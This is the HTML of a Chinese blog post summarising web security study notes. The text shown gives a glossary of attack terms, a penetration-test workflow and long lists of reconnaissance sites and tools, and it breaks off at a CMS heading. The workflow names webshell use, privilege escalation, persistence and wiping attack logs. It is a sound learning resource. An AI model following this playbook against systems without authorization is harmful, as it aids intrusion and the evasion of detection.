

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/%E8%95%BE%E5%A7%86.png">
  <link rel="icon" href="/img/%E8%95%BE%E5%A7%86.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#58C9B9">
  <meta name="author" content="SCxiaoyun">
  <meta name="keywords" content="">
  
    <meta name="description" content="[TOC] ¶前言： 学习了很多渗透方面的知识，但是本人又不喜欢复习，感觉理论知识非常欠缺（本人记性不好，忘性很大😫😫😫）尤其是自己组织语言，所以这里对知识进行一个大体的系统的总结。  Web渗透 ¶一、安全术语（行业黑话）   肉鸡:   僵尸网络：僵尸网络 Botnet 是指采用一种或多种传播手段，将大量主机感 染病毒，从而在控制者和被感染主机之间所形成的一个可一对多控制的网络僵尸网络是">
<meta property="og:type" content="article">
<meta property="og:title" content="Web安全学习总结">
<meta property="og:url" content="https://jsweetcoffee.github.io/posts/d62edc36.html">
<meta property="og:site_name" content="晓雲的陋室">
<meta property="og:description" content="[TOC] ¶前言： 学习了很多渗透方面的知识，但是本人又不喜欢复习，感觉理论知识非常欠缺（本人记性不好，忘性很大😫😫😫）尤其是自己组织语言，所以这里对知识进行一个大体的系统的总结。  Web渗透 ¶一、安全术语（行业黑话）   肉鸡:   僵尸网络：僵尸网络 Botnet 是指采用一种或多种传播手段，将大量主机感 染病毒，从而在控制者和被感染主机之间所形成的一个可一对多控制的网络僵尸网络是">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d62edc36/SQLmap.jpeg">
<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d62edc36/1683710868825-3bcd85b4-887e-4ef2-8e61-685cef9d7fd9.png">
<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d62edc36/1683710880582-3d46ca6b-9367-4f1e-8ca6-448bd146cb98.png">
<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d62edc36/1677139760844-ffc9672c-3e1f-464b-9fe7-6d6b2d6b47fd.png">
<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d62edc36/1684842263166-e1f4b12f-49de-46ca-8277-52dd79221758.png">
<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d62edc36/1684847477587-c0cee458-c4ce-443b-b17e-751c48fa0022.png">
<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d62edc36/1684848862756-de52a5f2-f4a0-4c09-99b8-2fc8215498d9.png">
<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d62edc36/1685366000309-276662e8-346f-4353-ac78-bb379268fcf6.png">
<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d62edc36/1685366016258-ed5bb3ea-6e88-4bab-926e-9b5ac0d3adb7.png">
<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d62edc36/image-20230728161632099.png">
<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d62edc36/1690266827967-c7f3cd69-031d-4069-9917-2d915dc64930.jpeg">
<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d62edc36/1690266827967-c7f3cd69-031d-4069-9917-2d915dc64930-1693987765629-1.jpeg">
<meta property="article:published_time" content="2023-07-14T06:14:27.000Z">
<meta property="article:modified_time" content="2023-09-21T12:28:44.000Z">
<meta property="article:author" content="SCxiaoyun">
<meta property="article:tag" content="Web安全">
<meta property="article:tag" content="面试总结">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://jsweetcoffee.github.io/posts/d62edc36/SQLmap.jpeg">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>Web安全学习总结 - 晓雲的陋室</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"jsweetcoffee.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":50,"cursorChar":"♫","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading2.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":"ture","follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  

  

  



  
<meta name="generator" content="Hexo 5.4.2"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>聊五分钱的天吗？|ω･)و ̑̑༉</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/pic9.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Web安全学习总结"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        SCxiaoyun
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-07-14 14:14" pubdate>
          2023年7月14日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          77k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          642 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Web安全学习总结</h1>
            
              <p class="note note-info">
                
                  
                    本文最后更新于：2023年9月21日 晚上
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>[TOC]</p>
<h3 id="前言："><a class="header-anchor" href="#前言：">¶</a>前言：</h3>
<p>学习了很多渗透方面的知识，但是本人又不喜欢复习，感觉理论知识非常欠缺（本人记性不好，忘性很大😫😫😫）尤其是自己组织语言，所以这里对知识进行一个<strong>大体</strong>的系统的总结。</p>
<hr>
<h1>Web渗透</h1>
<h2 id="一、安全术语（行业黑话）"><a class="header-anchor" href="#一、安全术语（行业黑话）">¶</a>一、安全术语（行业黑话）</h2>
<ol>
<li>
<p><strong>肉鸡</strong>:</p>
</li>
<li>
<p><strong>僵尸网络</strong>：僵尸网络 Botnet 是指采用一种或多种传播手段，将大量主机感 染病毒，从而在控制者和被感染主机之间所形成的一个可一对多控制的网络僵尸网络是一个非常形象的比喻，众多的计算机在不知不 觉中如同中国古老传说中的僵尸群一样被人驱赶和指挥着，成为被 攻击者执行各类恶意活动（DDOS、垃圾邮件等）利用的一种基础 设施。</p>
</li>
<li>
<p><strong>木马</strong>：木马病毒是指隐藏在正常程序中的一段具有特殊功能的恶意代码，是具备破坏和删除文件、发送密码、记录键盘和攻击Dos等特殊功能的后门程序。</p>
</li>
<li>
<p><strong>网页木马</strong>:伪装成网页文件或直接插入正常的网页文件中，当有人访问或执行时，就会利用对方系统或浏览器的漏洞自动下载木马到访问者的电脑上执行。</p>
</li>
<li>
<p><strong>蠕虫病毒</strong>：它是一类相对独立的恶意代码，利用了联网系统的开放性特点，通过可远程利用的漏洞自主地进行传播，受到控制终端会变成攻击的发起方，尝试感染更多的系统。蠕虫病毒的主要特性有：自我复制能力、很强的传播性、潜伏性、特定的触发性、很大的破坏性。</p>
</li>
<li>
<p><strong>震网病毒</strong>：名 Stuxnet 病毒，是第一个专门定向攻击真实世界中基础（能源）设施的“蠕虫”病毒，比如核电站，水坝，国家电网。作为世界上首个网络“超级破坏性武器”，Stuxnet 的计算机病毒已经感染了全球超过 45000 个网络，其目标伊朗的铀浓缩设备遭到的攻击最为严重。</p>
</li>
<li>
<p><strong>C2</strong>：C2 全称为 Command and Control，命令与控制，常见于 APT 攻击场景中。作动词解释时理解为恶意软件与攻击者进行交互，作名词解释时理解为攻击者的“基础设施”。 供应链攻击是黑客攻击目标机构的合作伙伴，并以该合作伙为跳板，达到渗透目标用户的目的。</p>
</li>
<li>
<p><strong>APT 攻击</strong>：Advanced Persistent Threat，即<strong>高级可持续威胁攻击</strong>，指某组织在网络上对特定对象展开的持续有效的攻击活动。</p>
</li>
<li>
<p><strong>嗅探</strong>：　嗅探指窃听网络中流经的数据包，这里的网络一般指用集线器或路由器组建的局域网。通过嗅探并解析数据包，便可知道数据包中的信息，一旦含有账户密码等隐私信息就可能造成个人资金损失。</p>
</li>
<li>
<p><strong>水坑攻击</strong>：黑客通过分析被攻击者的网络活动规律，寻找被攻击者经常访问的网站的弱点，先攻下该网站并植入攻击代码，等待被攻击者来访时实施攻击。</p>
</li>
<li>
<p><strong>钓鲸攻击</strong>：攻击者针对高层，如首席执行官，首席财务官和首席运营官。钓鲸的目标是经过精心挑选的，因为受害者价值很高，而被盗的信息将比普通员工提供的信息更有价值。钓鲸需要依赖于社交工程，攻击者需要更好地了解目标。</p>
</li>
<li>
<p><strong>鱼叉攻击</strong>：鱼叉式攻击是一种较为高级的网络钓鱼攻击手法，针对特定的目标或组织，借助构造特定主题和内容的邮件、短信等第三方媒介，吸引特定目标群体打开链接或下载附件等方式的钓鱼攻击行为。</p>
</li>
<li>
<p><strong>网络钓鱼</strong>：在网络钓鱼过程中，攻击者使用诱饵（如电子邮件、手机短信、QQ链接等）将攻击代码发送给大量用户，期待少数安全意识弱的用户“上钩”，进而达到“钓鱼”（如窃取用户的隐私信息）的目的。</p>
</li>
<li>
<p><strong>反弹端口</strong>：是指受害者服务器的某一个端口不能访问，我们通过反弹端口的形式，让攻击者能够访问该端口，也叫端口转发</p>
</li>
<li>
<p><strong>DDoS</strong>：DDoS攻击一般指分布式拒绝攻击，是一种攻击者操纵大量计算机，或位于不同位置的多个攻击者，在短时间内通过将攻击伪装成大量的合法请求，向服务器资源发动的攻击，导致请求数量超过了服务器的处理能力，造成服务器运行缓慢或者宕机。通常由僵尸网络用于执行此恶意任务，由于攻击的发出点是分布在不同地方的，这类攻击称为分布式拒绝服务攻击。<br>
<strong>软件脱壳</strong>：壳是用来保护计算机软件不被非法修改或编译的程序；</p>
</li>
<li>
<p><strong>缓冲区溢出</strong>：指当计算机向缓冲区填充数据时超出了缓冲区本身的容量，溢出的数据覆盖在合法数据上。程序崩溃、导致拒绝服务、</p>
<p>​    跳转并且执行一段恶意代码。造成缓冲区溢出的主要原因是程序中没有仔细检查用户输入。</p>
</li>
<li>
<p><strong>挂马</strong>：</p>
</li>
<li>
<p>挂马攻击是指攻击者在已经获得控制权的网站的网页中嵌入恶意代码（通常是通过IFrame、Script引用来实现），当用户访问该网页时，嵌入的恶意代码利用浏览器本身的漏洞、第三方ActiveX漏洞或者其它插件（如Flash、PDF插件等）漏洞，在用户不知情的情况下下载并执行恶意木马。</p>
</li>
<li>
<p><strong>0/1/N Day 漏洞</strong>:</p>
</li>
<li>
<p><strong>后门</strong>:</p>
</li>
<li>
<p><strong>攻击载荷（payload）</strong>:</p>
</li>
<li>
<p><strong>Rootkit</strong>：是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。</p>
</li>
<li>
<p><strong>横移</strong>：横向移动是网络攻击者使用的一种常见策略，用于在整个网络中旋转，以便访问受害组织的敏感信息和用户信息。</p>
<p>威胁行为者获得公司网络的访问权限后，通常会尝试通过横向移动和侦察收集尽可能多的有关组织的信息，包括关键信息的位置、用户活动、如何获得特权以及如何避免被发现。</p>
</li>
<li>
<p><strong>渗透</strong>：</p>
</li>
<li>
<p><strong>跳板</strong>:</p>
</li>
<li>
<p><strong>暗链</strong>：暗链又叫隐藏链接，指的是正常的链接通过一些方法，如：把链接放入js代码中，使用display:none等等，从而使用户在正常浏览网页的时候无法看到这个链接。暗链是对搜索引擎的一种欺骗，导致搜索引擎的误判，将高权重分配给原本没有价值的网站甚至是钓鱼网站。</p>
</li>
<li>
<p><strong>拖库</strong>：拖库本来是数据库领域的术语，指从数据库中导出数据。到了黑客攻击泛滥的今天，它被用来指网站遭到入侵后，黑客窃取其数据库文件，拖库的主要防护手段是数据库加密。</p>
</li>
<li>
<p><strong>CC 攻击（Challenge Collapsar）</strong>：CC攻击算得上是应用层的DDoS，而且是经过TCP握手协议之后，CC的攻击原理很简单，就是模拟多个用户对一些资源消耗较大的页面不断发出请求，从而达到消耗服务器资源的目的，当服务器一直都有处理不完的大量数据请求时，服务器资源浪费过多，就会造成堵塞，而正常用户的访问也会被终止，网站陷入瘫痪状态。</p>
</li>
<li>
<p><strong>欺骗攻击</strong>：网络欺骗的技术主要有：HONEYPOT 和分布式 HONEYPOT、欺骗空间技术等。 主要方式有：IP 欺骗、ARP 欺骗、 DNS 欺骗、Web 欺骗、电子邮件欺骗、源路由欺骗（通过指定路由，以假冒身份与其他主机进行合法通信或发送假报文，使受攻击主机出现错误动作）、地址欺骗（包括伪造源地址和伪造中间站点）等。</p>
</li>
<li>
<p><strong>社会工程学</strong>：一种无需依托任何黑客软件，更注重研究人性弱点的黑客手法正在兴起，这就是社会工程学黑客技术。</p>
</li>
<li>
<p><strong>老三样</strong>：通常指 IDS、防火墙和反病毒三样历史最悠久安全产品。</p>
</li>
<li>
<p>**堡垒机：**运用各种技术手段监控和记录运维人员对网络内的服务器、网络设备、安全设备、数据库等设备的操作行为，以便集中报警、及时处理及审计定责。数据库审计 能够实时记录网络上的数据库活动，对数据库操作进行细粒度审计的合规性管理，对数据库遭受到的风险行为进行告警，对攻击行为进行阻断。 它通过对用户访问数据库行为的记录、分析和汇报，用来帮助用户事后生成合规报告、事故追根溯源，同时加强内外部数据库网络行为记录，提高数据资产安全。</p>
</li>
<li>
<p>**VPN：**虚拟专用网，在公用网络上建立专用网络，进行加密通讯，通过对数据包的加密和数据包目标地址的转换实现远程访问。</p>
</li>
<li>
<p><strong>蜜罐（Honeypot）</strong>：是一个包含漏洞的系统，它摸拟一个或多个易受攻击的主机，给黑客提供一个容易攻击的目标。 由于蜜罐没有其它任务需要完成，因此所有连接的尝试都应被视为是可疑的。</p>
</li>
<li>
<p><strong>沙箱</strong>：沙箱是一种用于安全的运行程序的机制。它常常用来执行那些非可信的程序。 非可信程序中的恶意代码对系统的影响将会被限制在沙箱内而不会影响到系统的其它部分。</p>
</li>
<li>
<p><strong>沙箱逃逸</strong>：一种识别沙箱环境，并利用静默、欺骗等技术，绕过沙箱检测的现象</p>
</li>
<li>
<p>**南北向流量：**通常指数据中心内外部通信所产生的的流量。</p>
</li>
<li>
<p><strong>东西向流量</strong>：通常指数据中心内部不同主机之间互相通信所产生的的流量。</p>
</li>
</ol>
<h2 id="二、信息收集"><a class="header-anchor" href="#二、信息收集">¶</a>二、信息收集</h2>
<blockquote>
<p>当你能够收集足够多的信息，你已经完成了渗透的60%。																											——我说的</p>
</blockquote>
<p>**什么是渗透测试：**渗透测试就是通过模拟真实得黑客攻击来检测信息系统得安全性。</p>
<p>**目的：**侵入系统或挖掘漏洞获取机密信息将入侵的过程和细节产生报告提供给用户，由此确定客户系统中所存在的安全威胁，并能够及时提醒安全管理员完善安全策略，降低安全风险。</p>
<p><strong>渗透测试得类型</strong>：黑盒测试、白盒测试、灰盒测试</p>
<ul>
<li><strong>黑盒</strong>：称功能测试，渗透者完全处于对系统一无所知的状态。完全模拟真实网络环境中的外部攻击者，采用流行的攻击技术与工具进行测试，揭示目标网络中一些已知或未知的安全漏洞。</li>
<li><strong>白盒</strong>：测试者可以通过正常的渠道向被测单位索要各种资料信息，包括（账户、网站源码、拓扑等信息）这类测试的目的是模拟企业内部雇员的越权操作。</li>
<li><strong>灰盒</strong>： 是白盒测试和黑盒测试基本类型的组合，它可以提供对目标系统更加深入和全面的安全审查。组合之后的好处就是能够同时发挥两种渗透测试方法的各自优势。</li>
</ul>
<h3 id="Web渗透测试流程"><a class="header-anchor" href="#Web渗透测试流程">¶</a>Web渗透测试流程</h3>
<ul>
<li>**获取授权/确认目标：**要有盖章授权书/与客户沟通好渗透测试的范围；</li>
<li>**信息收集：**从WEB层面/系统层面展开信息搜集；</li>
<li>**漏洞测试：**使用APPSCAN/AWVS/NESSUS/ xray/nucli/挖掘到漏洞</li>
<li>**漏洞利用：**利用漏洞获取WebShell(网站后门)</li>
<li>**权限提升：**www-data --&gt; root  /  IIS-USER --&gt; System</li>
<li>**权限维持：**系统后门/…</li>
<li>**痕迹清理：**WEB攻击日志/系统攻击日志 清楚掉</li>
<li>**撰写报告：**将攻击过程写道WORD文档提交SRC</li>
</ul>
<h3 id="信息收集内容"><a class="header-anchor" href="#信息收集内容">¶</a>信息收集内容</h3>
<h4 id="分类："><a class="header-anchor" href="#分类：">¶</a>分类：</h4>
<p><strong>主动式信息搜集（可获取到的信息较多，但易被目标发现）</strong><br>
通过直接发起与被测目标网络之间的互动来获取相关信息，如通过Nmap扫描目标系统。</p>
<p><strong>被动式信息搜集（搜集到的信息较少，但不易被发现）</strong><br>
通过第三方服务来获取目标网络相关信息。如通过搜索引擎方式来搜集信息。</p>
<h4 id="Web层面"><a class="header-anchor" href="#Web层面">¶</a>Web层面</h4>
<blockquote>
<p>通常来说，平时挖src的时候，最坏的情况就是只能获取一个IP地址，但一般情况下进行渗透测试都会得到一个域名。</p>
</blockquote>
<ol>
<li>
<h5 id="IP反查域名："><a class="header-anchor" href="#IP反查域名：">¶</a><strong>IP反查域名</strong>：</h5>
<p>Reverse IP Lookup：<a target="_blank" rel="noopener" href="https://www.yougetsignal.com/tools/web-sites-on-web-server/">https://www.yougetsignal.com/tools/web-sites-on-web-server/</a></p>
<p>爱站网：<a target="_blank" rel="noopener" href="https://www.aizhan.com/">https://www.aizhan.com/</a></p>
<p>站长之家：<a target="_blank" rel="noopener" href="https://stool.chinaz.com/same/">https://stool.chinaz.com/same/</a></p>
</li>
<li>
<h5 id="ICP备案："><a class="header-anchor" href="#ICP备案：">¶</a><strong>ICP备案</strong>：</h5>
<p>工信部：<a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/recordQuery">https://beian.miit.gov.cn/#/Integrated/recordQuery</a></p>
</li>
<li>
<h5 id="Whois信息："><a class="header-anchor" href="#Whois信息：">¶</a><strong>Whois信息</strong>：</h5>
<blockquote>
<p>在渗透测试中可通过whois查询我们可以查询到注册商、注册人、邮件、DNS解析服务器、注册人联系电话等信息；</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="http://xn--who-ok6ez9gts1e.is">国外的who.is</a>：<a target="_blank" rel="noopener" href="https://who.is/">https://who.is/</a><br>
站长之家：<a target="_blank" rel="noopener" href="http://whois.chinaz.com/">http://whois.chinaz.com/</a><br>
爱站网：<a target="_blank" rel="noopener" href="https://whois.aizhan.com/">https://whois.aizhan.com/</a><br>
微步：<a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br>
腾讯云：<a target="_blank" rel="noopener" href="https://whois.cloud.tencent.com/">https://whois.cloud.tencent.com/</a><br>
美橙互联：<a target="_blank" rel="noopener" href="https://whois.cndns.com/">https://whois.cndns.com/</a><br>
爱名网：<a target="_blank" rel="noopener" href="https://www.22.cn/domain/">https://www.22.cn/domain/</a><br>
易名网：<a target="_blank" rel="noopener" href="https://whois.ename.net/">https://whois.ename.net/</a><br>
中国万网：<a target="_blank" rel="noopener" href="https://whois.aliyun.com/">https://whois.aliyun.com/</a><br>
西部数码：<a target="_blank" rel="noopener" href="https://whois.west.cn/">https://whois.west.cn/</a><br>
新网域名：<a target="_blank" rel="noopener" href="http://whois.xinnet.com/domain/whois/index.jsp">http://whois.xinnet.com/domain/whois/index.jsp</a><br>
纳网域名：<a target="_blank" rel="noopener" href="http://whois.nawang.cn/">http://whois.nawang.cn/</a><br>
中资源域名：<a target="_blank" rel="noopener" href="https://www.zzy.cn/domain/whois.html">https://www.zzy.cn/domain/whois.html</a><br>
三五互联域名：<a target="_blank" rel="noopener" href="https://cp.35.com/chinese/whois.php">https://cp.35.com/chinese/whois.php</a><br>
新网互联域名：<a target="_blank" rel="noopener" href="http://www.dns.com.cn/show/domain/whois/index.do">http://www.dns.com.cn/show/domain/whois/index.do</a></p>
</li>
<li>
<h5 id="子域名信息："><a class="header-anchor" href="#子域名信息：">¶</a><strong>子域名信息：</strong></h5>
<blockquote>
<p>为什么要收集子域呢？假设目标资产数量庞大，一般来说主域都是防护重点，管理上可能会谨慎，防护也相对严格，因此从子域名入手便成了很好的选择，子域往往在防护上会相对更加的松懈，然后再慢慢向目标系统渗透，所以子域名的收集便显得尤为的重要。（中路站了5个人打不过，你还不会从边路偷家？😏）</p>
</blockquote>
<p>域名分为根域名和子域名：一般查询子域的时候我们需要知道他的顶级域名。<a target="_blank" rel="noopener" href="http://xn--baidu-gv5ij80i.com">比如baidu.com</a>（没有WWW），但是有时也比较特殊，比如tyut.edu.cn也算是顶级域名。</p>
<p><strong>线上工具：</strong></p>
<p>可以通过网络空间测绘进行搜索；也有专门的网站：</p>
<p>DNSDB：<a target="_blank" rel="noopener" href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><br>
在线子域名查询：<a target="_blank" rel="noopener" href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a><br>
ip或域名查询：<a target="_blank" rel="noopener" href="https://site.ip138.com/">https://site.ip138.com/</a><br>
子域名扫描：<a target="_blank" rel="noopener" href="https://www.t1h2ua.cn/tools/">https://www.t1h2ua.cn/tools/</a><br>
Aleax网站：<a target="_blank" rel="noopener" href="https://alexa.chinaz.com/">https://alexa.chinaz.com/</a><br>
securitytrails：<a target="_blank" rel="noopener" href="https://securitytrails.com/list/apex_domain/www.baidu.com">https://securitytrails.com/list/apex_domain/www.baidu.com</a><br>
dns侦测：<a target="_blank" rel="noopener" href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p>
<p>○ findsubdomains：<a target="_blank" rel="noopener" href="https://findsubdomains.com/">https://findsubdomains.com/</a>        //好使</p>
<p>○ netcraft：<a target="_blank" rel="noopener" href="https://searchdns.netcraft.com/">https://searchdns.netcraft.com/</a>          //好使<br>
○ 百度云观测：<a target="_blank" rel="noopener" href="http://ce.baidu.com/index/getRelatedSites?site_address=%7Bdomain%7D">http://ce.baidu.com/index/getRelatedSites?site_address={domain}</a>  //好使<br>
○ hackertarget：<a target="_blank" rel="noopener" href="https://hackertarget.com/find-dns-host-records/">https://hackertarget.com/find-dns-host-records/</a>   //好使</p>
<p># 威胁情报平台<br>
AlienVault：<a target="_blank" rel="noopener" href="https://otx.alienvault.com/">https://otx.alienvault.com/</a><br>
RiskIQ 社区版：<a target="_blank" rel="noopener" href="https://community.riskiq.com/">https://community.riskiq.com/</a><br>
微步在线：<a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br>
<a target="_blank" rel="noopener" href="http://ThreatMiner.org">ThreatMiner.org</a>：<a target="_blank" rel="noopener" href="https://www.threatminer.org/domain.php?q=%7Bdomain%7D">https://www.threatminer.org/domain.php?q={domain}</a><br>
VT：<a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/domain/%7Bdomain%7D/relations">https://www.virustotal.com/gui/domain/{domain}/relations</a><br>
<a target="_blank" rel="noopener" href="http://Pentest-Tools.com">Pentest-Tools.com</a>：<a target="_blank" rel="noopener" href="https://pentest-tools.com/information-gathering/find-subdomains-of-domain#">https://pentest-tools.com/information-gathering/find-subdomains-of-domain#</a></p>
<p><strong>线下工具：</strong></p>
<ol>
<li>Layer子域名挖掘机：<a target="_blank" rel="noopener" href="https://github.com/euphrat1ca/LayerDomainFinder">https://github.com/euphrat1ca/LayerDomainFinder</a></li>
<li>OneForAll：<a target="_blank" rel="noopener" href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></li>
<li>subDomainBrute：<a target="_blank" rel="noopener" href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></li>
<li>theHarvester（kali自带综合搜索工具）</li>
</ol>
</li>
<li>
<h5 id="旁站-C段-信息"><a class="header-anchor" href="#旁站-C段-信息">¶</a><strong>旁站/C段 信息</strong></h5>
<blockquote>
<p>旁注攻击就是说在攻击目标时，对目标网站“无法下手”找不到目标网站的漏洞，那么<em>攻击者就可以通过在<strong>与目标站点同一服务器下的站点渗透</strong></em>，从而获取目标站点的权限，这过程就是旁注攻击；</p>
<p>C段指的是<em><strong>同一内网段内的其他服务器</strong></em></p>
</blockquote>
<p>**在线工具：**fofa、shodan等</p>
<p><a target="_blank" rel="noopener" href="http://www.webscan.cc/">http://www.webscan.cc/</a></p>
<p><a target="_blank" rel="noopener" href="http://www.5kik.com/">http://www.5kik.com/</a></p>
<p><strong>线下工具：</strong></p>
<p>k8：<a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan%EF%BC%88%E6%9C%80%E6%96%B0%E7%89%88%EF%BC%9ALadon">https://github.com/k8gege/K8CScan（最新版：Ladon</a> <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon%EF%BC%89">https://github.com/k8gege/Ladon）</a></p>
<p>御剑1.5：</p>
</li>
<li>
<h5 id="CMS（Content-Management-System）"><a class="header-anchor" href="#CMS（Content-Management-System）">¶</a><strong>CMS</strong>（Content Management System）</h5>
